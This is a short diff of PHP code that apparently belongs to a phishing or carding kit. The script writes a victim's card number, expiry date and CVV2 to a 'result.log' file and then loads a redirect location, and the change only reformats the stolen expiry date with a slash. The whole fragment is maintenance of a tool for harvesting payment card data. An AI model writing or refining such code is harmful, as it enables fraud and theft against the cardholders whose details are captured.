@@ -20,7 +20,7 @@ fwrite($fp, $al);
 fclose($fp);
 
 $fs = fopen("result.log", "a+");
-fwrite($fs, "\n[CARD] ".$number."\n[DATE] ".$expirx.$expiry."\n[CVV2] ".$cvc."\n");
+fwrite($fs, "\n[CARD] ".$number."\n[DATE] ".$expirx."/".$expiry."\n[CVV2] ".$cvc."\n");
 fclose($fs);
 $reloc = file_get_contents("location.location");
 ?>
